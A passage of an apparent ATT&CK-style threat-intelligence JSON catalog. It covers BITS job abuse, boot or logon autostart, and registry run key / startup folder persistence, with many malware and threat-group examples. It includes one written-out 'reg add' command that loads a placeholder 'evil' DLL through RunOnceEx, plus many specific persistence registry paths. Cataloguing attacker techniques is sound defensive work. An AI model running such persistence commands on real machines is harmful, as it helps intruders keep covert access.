tool.\nAdversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).\nBITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.", "id": "T1197", "examples": [{"id": "G0087", "name": "APT39", "description": "APT39 has used the BITS protocol to exfiltrate stolen data from a compromised host."}, {"id": "G0096", "name": "APT41", "description": "APT41 used BITSAdmin to download and install payloads."}, {"id": "S0534", "name": "Bazar", "description": "Bazar has been downloaded via Windows BITS functionality."}, {"id": "S0190", "name": "BITSAdmin", "description": "BITSAdmin can be used to create BITS Jobs to launch a malicious process."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can download a hosted \"beacon\" payload using BITSAdmin."}, {"id": "S0554", "name": "Egregor", "description": "Egregor has used BITSadmin to download and execute malicious DLLs."}, {"id": "S0201", "name": "JPIN", "description": "A JPIN variant downloads the backdoor payload via the BITS service."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used BITSAdmin to download additional tools."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can use BITS Utility to connect with the C2 server."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has used BITS jobs to download malicious payloads."}, {"id": "S0654", "name": "ProLock", "description": "ProLock can use BITS jobs to download its malicious payload."}, {"id": "S0333", "name": "UBoatRAT", "description": "UBoatRAT takes advantage of the /SetNotifyCmdLine option in BITSAdmin to ensure it stays running on a system to maintain persistence."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used batch scripts that utilizes WMIC to execute a BITSAdmin transfer of a ransomware payload to each compromised machine."}], "sub_techniques": []}, {"name": "Boot or Logon Autostart Execution", "description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.", "detailed_description": "Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.", "id": "T1547", "examples": [{"id": "S0651", "name": "BoxCaon", "description": "BoxCaon established persistence by setting the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load registry key to point to its executable."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack\u2019s RAT makes a persistent target file with auto execution on the host start."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has created registry keys for persistence, including HKCU\\Software\\bkfouerioyou, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{6afa8072-b2b1-31a8-b5c1-{Unique Identifier}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3BF41072-B2B1-31A8-B5C1-{Unique Identifier}."}, {"id": "S0083", "name": "Misdat", "description": "Misdat has created registry keys for persistence, including HKCU\\Software\\dnimtsoleht\\StubPath, HKCU\\Software\\snimtsOleht\\StubPath, HKCU\\Software\\Backtsaleht\\StubPath, HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed. Components\\{3bf41072-b2b1-21c8-b5c1-bd56d32fbda7}, and HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{3ef41072-a2f1-21c8-c5c1-70c2c3bc7905}."}, {"id": "S0653", "name": "xCaon", "description": "xCaon has added persistence via the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load which causes the malware to run each time any user logs in."}], "sub_techniques": [{"name": "Registry Run Keys / Startup Folder", "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.", "detailed_description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.\nThe following run keys are created by default on Windows systems:\nRun keys may exist under multiple hives. The HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency. For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\\Users\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup. The startup folder path for all users is C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp.\nThe following Registry keys can be used to set startup folder items for persistence:\nThe following Registry keys can control automatic startup of services during boot:\nUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:\nPrograms listed in the load value of the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows run automatically for the currently logged-on user.\nBy default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.", "id": "T1547.001", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL achieves persistence by adding itself to the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can add itself to the Registry as a startup program to establish persistence."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has changed the Startup folder to the one containing its executable by overwriting the registry keys."}, {"id": "S1074", "name": "ANDROMEDA", "description": "ANDROMEDA can establish persistence by dropping a sample of itself to C:\\ProgramData\\Local Settings\\Temp\\mskmde.com and adding a Registry run key to execute every time a user logs on."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has the ability to create the Registry key name EstsoftAutoUpdate at HKCU\\Software\\Microsoft/Windows\\CurrentVersion\\RunOnce to establish persistence."}, {"id": "G0026", "name": "APT18", "description": "APT18 establishes persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key."}, {"id": "G0073", "name": "APT19", "description": "An APT19 HTTP malware variant establishes persistence by setting the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Windows Debug Tools-%LOCALAPPDATA%\\."}, {"id": "G0007", "name": "APT28", "description": "APT28 has deployed malware that has copied itself to the startup directory for persistence."}, {"id": "G0016", "name": "APT29", "description": "APT29 added Registry Run keys to establish persistence."}, {"id": "G0022", "name": "APT3", "description": "APT3 places scripts in the startup folder for persistence."}, {"id": "G0050", "name": "APT32", "description": "APT32 established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly."}, {"id": "G0064", "name": "APT33", "description": "APT33 has deployed a tool known as DarkComet to the Startup folder of a victim, and used Registry run keys to gain persistence."}, {"id": "G0067", "name": "APT37", "description": "APT37's has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\."}, {"id": "G0087", "name": "APT39", "description": "APT39 has maintained persistence using the startup folder."}, {"id": "G0096", "name": "APT41", "description": "APT41 created and modified startup files for persistence. APT41 added a registry key in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost to establish persistence for Cobalt Strike."}, {"id": "S0456", "name": "Aria-body", "description": "Aria-body has established persistence via the Startup folder or Run Registry key."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth creates a startup item for persistence. "}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer can place malicious executables in a victim's AutoRun registry key or StartUp directory, depending on the AV product installed, to maintain persistence."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon uses registry run keys for persistence."}, {"id": "S1053", "name": "AvosLocker", "description": "AvosLocker has been executed via the RunOnce Registry key to run itself on safe mode."}, {"id": "S0414", "name": "BabyShark", "description": "BabyShark has added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Backdoor.Oldrea adds Registry Run keys to achieve persistence."}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory."}, {"id": "S0128", "name": "BADNEWS", "description": "BADNEWS installs a registry Run key to establish persistence."}, {"id": "S0337", "name": "BadPatch", "description": "BadPatch establishes a foothold by adding a link to the malware executable in the startup folder."}, {"id": "S0534", "name": "Bazar", "description": "Bazar can create or add files to Registry Run Keys to establish persistence."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has added itself to the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\ for persistence."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer has set the run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0089", "name": "BlackEnergy", "description": "The BlackEnergy 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can establish persistence by writing the Registry value MicroNativeCacheSvc to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0204", "name": "Briba", "description": "Briba creates run key Registry entries pointing to malicious DLLs dropped to disk."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used a batch script that adds a Registry Run key to establish malware persistence."}, {"id": "S0471", "name": "build_downer", "description": "build_downer has the ability to add itself to the Registry Run key for persistence."}, {"id": "S0030", "name": "Carbanak", "description": "Carbanak stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has maintained persistence by placing itself inside the current user's startup folder."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT establishes Persistence by setting the  HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load Registry key to point to its executable."}, {"id": "S0631", "name": "Chaes", "description": "Chaes has added persistence via the Registry key software\\microsoft\\windows\\currentversion\\run\\microsoft windows html help."}, {"id": "S0144", "name": "ChChes", "description": "ChChes establishes persistence by adding a Registry Run key."}, {"id": "S1041", "name": "Chinoxy", "description": "Chinoxy has established persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key and by loading a dropper to (%COMMON_ STARTUP%\\\\eoffice.exe)."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can establish persistence by adding a Registry run key."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike."}, {"id": "S0338", "name": "Cobian RAT", "description": "Cobian RAT creates an autostart Registry key to ensure persistence."}, {"id": "S0244", "name": "Comnie", "description": "Comnie achieves persistence by adding a shortcut of itself to the startup path in the Registry."}, {"id": "S0608", "name": "Conficker", "description": "Conficker adds Registry Run keys to establish persistence."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has dropped malicious files into the startup folder %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup on a compromised host in order to maintain persistence."}, {"id": "S0137", "name": "CORESHELL", "description": "CORESHELL has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder."}, {"id": "S0046", "name": "CozyCar", "description": "One persistence mechanism used by CozyCar is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"}, {"id": "S0115", "name": "Crimson", "description": "Crimson can add Registry run keys for persistence."}, {"id": "S0235", "name": "CrossRAT", "description": "CrossRAT uses run keys for persistence on Windows."}, {"id": "G0070", "name": "Dark Caracal", "description": "Dark Caracal's version of Bandook adds a registry key to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet adds several Registry entries to enable automatic execution at every system startup."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate installation includes AutoIt script execution creating a shortcut to itself as an LNK object, such as bill.lnk, in the victim startup folder. DarkGate installation finishes with the creation of a registry Run key."}, {"id": "G0012", "name": "Darkhotel", "description": "Darkhotel has been known to establish persistence by adding programs to the Run Registry key."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has established persistence via the Software\\Microsoft\\Windows NT\\CurrentVersion\\Run registry key and by creating a .lnk shortcut file in the Windows startup folder."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem can write itself to the Startup folder to gain persistence."}, {"id": "S0186", "name": "DownPaper", "description": "DownPaper uses PowerShell to add a Registry Run key in order to establish persistence."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has added the registry value ntdll to the Registry Run key to establish persistence."}, {"id": "S0062", "name": "DustySky", "description": "DustySky achieves persistence by creating a Registry entry in HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0081", "name": "Elise", "description": "If establishing persistence by installation as a new service fails, one variant of Elise establishes persistence for the created .exe file by setting the following Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe. Other variants have set the following Registry keys for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self] and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD."}, {"id": "S0082", "name": "Emissary", "description": "Variants of Emissary have added Run Registry keys to establish persistence."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed adding the downloaded payload to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to maintain persistence."}, {"id": "S0363", "name": "Empire", "description": "Empire can modify the registry run keys HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0396", "name": "EvilBunny", "description": "EvilBunny has created Registry keys for persistence in [HKLM|HKCU]\\\u2026\\CurrentVersion\\Run."}, {"id": "S0152", "name": "EvilGrab", "description": "EvilGrab adds a Registry Run key for ctfmon.exe to establish persistence."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can achieve persistence through the Registry Run key."}, {"id": "S0512", "name": "FatDuke", "description": "FatDuke has used HKLM\\SOFTWARE\\Microsoft\\CurrentVersion\\Run to establish persistence."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT adds a shortcut file to the startup folder for persistence."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has established persistence by using the Registry option in PowerShell Empire to add a Run key."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has used Windows Registry run keys such as, HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\hosts to maintain persistence."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder."}, {"id": "S0355", "name": "Final1stspy", "description": "Final1stspy creates a Registry Run key to establish persistence."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher establishes persistence by creating the Registry key HKCU\\Software\\Microsoft\\Windows\\Run."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has dropped an executable file to the startup directory."}, {"id": "S0036", "name": "FLASHFLOOD", "description": "FLASHFLOOD achieves persistence by making an entry in the Registry's Run key."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has established persistence via the HKCU\\SOFTWARE\\microsoft\\windows\\currentversion\\run registry key."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can use a Registry Run Key and the Startup folder to establish persistence."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group tools have registered Run keys in the registry to give malicious VBS files persistence."}, {"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence by creating a .lnk file in the Start menu."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can set persistence with a Registry run key."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has added a Registry Run key to establish persistence."}, {"id": "S0249", "name": "Gold Dragon", "description": "Gold Dragon establishes persistence in the Startup folder."}, {"id": "S1138", "name": "Gootloader", "description": "Gootloader can create an autorun entry for a PowerShell script to run at reboot."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can create a .lnk file and add a Registry Run key to establish persistence."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can use run keys and create link files in the startup folder for persistence."}, {"id": "S0417", "name": "GRIFFON", "description": "GRIFFON has used a persistence module that stores the implant inside the Registry, which executes at logon."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent can set persistence with a Registry run key."}, {"id": "S0561", "name": "GuLoader", "description": "GuLoader can establish persistence via the Registry under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce."}, {"id": "S0499", "name": "Hancitor", "description": "Hancitor  has added Registry Run keys to establish persistence."}, {"id": "S0170", "name": "Helminth", "description": "Helminth establishes persistence by creating a shortcut in the Start Menu folder."}, {"id": "S1027", "name": "Heyoka Backdoor", "description": "Heyoka Backdoor can establish persistence with the auto start function including using the value EverNoteTrayUService."}, {"id": "S0087", "name": "Hi-Zor", "description": "Hi-Zor creates a Registry Run key to establish persistence."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa added a spoofed binary to the start-up folder for persistence."}, {"id": "S0070", "name": "HTTPBrowser", "description": "HTTPBrowser has established persistence by setting the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key value for wdm to the path of the executable. It has also used the Registry entry HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn \"%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe\" to establish persistence."}, {"id": "S0483", "name": "IcedID", "description": "IcedID has established persistence by creating a Registry run key."}, {"id": "G0100", "name": "Inception", "description": "Inception has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\."}, {"id": "S0259", "name": "InnaputRAT", "description": "Some InnaputRAT variants establish persistence by modifying the Registry key HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can place a lnk file in the Startup Folder to achieve persistence."}, {"id": "S0015", "name": "Ixeshe", "description": "Ixeshe can achieve persistence by adding itself to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0389", "name": "JCry", "description": "JCry has created payloads in the Startup directory to maintain persistence. "}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process."}, {"id": "S0088", "name": "Kasidet", "description": "Kasidet creates a Registry Run key to establish persistence."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar adds a sub-key under several Registry run keys."}, {"id": "G0004", "name": "Ke3chang", "description": "Several Ke3chang backdoors achieved persistence by adding a Run key."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has placed scripts in the startup folder for persistence and modified the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce Registry key."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has added persistence to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS can set the AutoRun Registry key with a PowerShell command."}, {"id": "S0356", "name": "KONNI", "description": "A version of KONNI has dropped a Windows shortcut into the Startup folder to establish persistence."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can set an AutoRun key to establish persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key."}, {"id": "G0140", "name": "LazyScripter", "description": "LazyScripter has achieved persistence via writing a PowerShell script to the autorun registry key."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor."}, {"id": "S0513", "name": "LiteDuke", "description": "LiteDuke can create persistence by adding a shortcut in the CurrentVersion\\Run Registry key."}, {"id": "S0397", "name": "LoJax", "description": "LoJax has modified the Registry key \u2018HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute\u2019 from \u2018autocheck autochk \u2019 to \u2018autocheck autoche \u2019 in order to execute its payload during Windows startup."}, {"id": "S0582", "name": "LookBack", "description": "LookBack sets up a Registry Run key to establish a persistence mechanism."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer can persist by setting Registry key values HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used malicious DLLs that setup persistence in the Registry Key HKCU\\Software\\Microsoft\\Windows\\Current Version\\Run."}, {"id": "S0409", "name": "Machete", "description": "Machete used the startup folder for persistence."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound malware has used Registry Run keys to establish persistence."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka can establish persistence by adding Registry Run keys."}, {"id": "S0449", "name": "Maze", "description": "Maze has created a file named \"startup_vrun.bat\" in the Startup folder of a virtual machine to establish persistence."}, {"id": "S0500", "name": "MCMD", "description": "MCMD can use Registry Run Keys for persistence."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has configured persistence to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, Spotify =% APPDATA%\\Spotify\\Spotify.exe and used .LNK files in the startup folder to achieve persistence."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu creates a link in the startup folder for persistence. Mispadu adds persistence via the registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0080", "name": "Mivast", "description": "Mivast creates the following Registry entry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia."}, {"id": "S0553", "name": "MoleNet", "description": "MoleNet can achieve persitence on the infected machine by setting the Registry run key."}, {"id": "G0021", "name": "Molerats", "description": "Molerats saved malicious files within the AppData and Startup folders to maintain persistence."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can establish persistence with the auto start function including using the value EverNoteTrayUService."}, {"id": "G1036", "name": "Moonstone Sleet", "description": "Moonstone Sleet used registry run keys for process execution during initial victim infection."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito establishes persistence under the Registry key HKCU\\Software\\Run auto_update."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has added Registry Run key KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding to establish persistence."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has created the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyU to maintain persistence."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has modified a victim's Windows Run registry to establish persistence."}, {"id": "S0228", "name": "NanHaiShu", "description": "NanHaiShu modifies the %regrun% Registry to point itself to an autostart mechanism."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine."}, {"id": "S0247", "name": "NavRAT", "description": "NavRAT creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can achieve persistence through a Registry Run key."}, {"id": "S0034", "name": "NETEAGLE", "description": "The \"SCOUT\" variant of NETEAGLE achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE creates a Registry start-up entry to establish persistence."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\ and dropped a shortcut in %STARTUP%."}, {"id": "S0353", "name": "NOKKI", "description": "NOKKI has established persistence by writing the payload to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run."}, {"id": "S0644", "name": "ObliqueRAT", "description": "ObliqueRAT can gain persistence by a creating a shortcut in the infected user's Startup directory."}, {"id": "S0340", "name": "Octopus", "description": "Octopus achieved persistence by placing a malicious executable in the startup directory and has added the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to the Registry."}, {"id": "S0439", "name": "Okrum", "description": "Okrum establishes persistence by creating a .lnk shortcut to itself in the Startup folder."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group placed LNK files into the victims' startup folder for persistence."}, {"id": "C0013", "name": "Operation Sharpshooter", "description": "During Operation Sharpshooter, a first-stage downloader installed Rising Sun to %Startup%\\mssync.exe on a compromised host."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key."}, {"id": "S1145", "name": "Pikabot", "description": "Pikabot maintains persistence following system checks through the Run key in the registry."}, {"id": "S0124", "name": "Pisloader", "description": "Pisloader establishes persistence via a Registry Run key."}, {"id": "S0254", "name": "PLAINTEE", "description": "PLAINTEE gains persistence by adding the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce."}, {"id": "S0013", "name": "PlugX", "description": "PlugX adds Run key entries in the Registry to establish persistence."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has added a registry key in the  hive for persistence."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates run key Registry entries pointing to a malicious executable dropped to disk."}, {"id": "S0139", "name": "PowerDuke", "description": "PowerDuke achieves persistence by using various Registry Run keys."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower sets up persistence with a Registry run key."}, {"id": "S0145", "name": "POWERSOURCE", "description": "POWERSOURCE achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit's New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key."}, {"id": "S0371", "name": "POWERTON", "description": "POWERTON can install a Registry Run key for persistence."}, {"id": "S0113", "name": "Prikormka", "description": "Prikormka adds itself to a Registry Run key with the name guidVGA or guidVSA."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has used Registry run keys to establish persistence."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon copies itself to the Startup folder to establish persistence."}, {"id": "S0196", "name": "PUNCHBUGGY", "description": "PUNCHBUGGY has been observed using a Registry Run key."}, {"id": "S0192", "name": "Pupy", "description": "Pupy adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "G0024", "name": "Putter Panda", "description": "A dropper used by Putter Panda installs itself into the ASEP Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with a value named McUpdate."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can maintain persistence by creating an auto-run Registry key."}, {"id": "S0262", "name": "QuasarRAT", "description": "If the QuasarRAT client process does not have administrator privileges it will add a registry key to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay has created Registry Run keys to establish persistence."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will use a Registry key to achieve persistence through reboot, setting a RunOnce key such as: 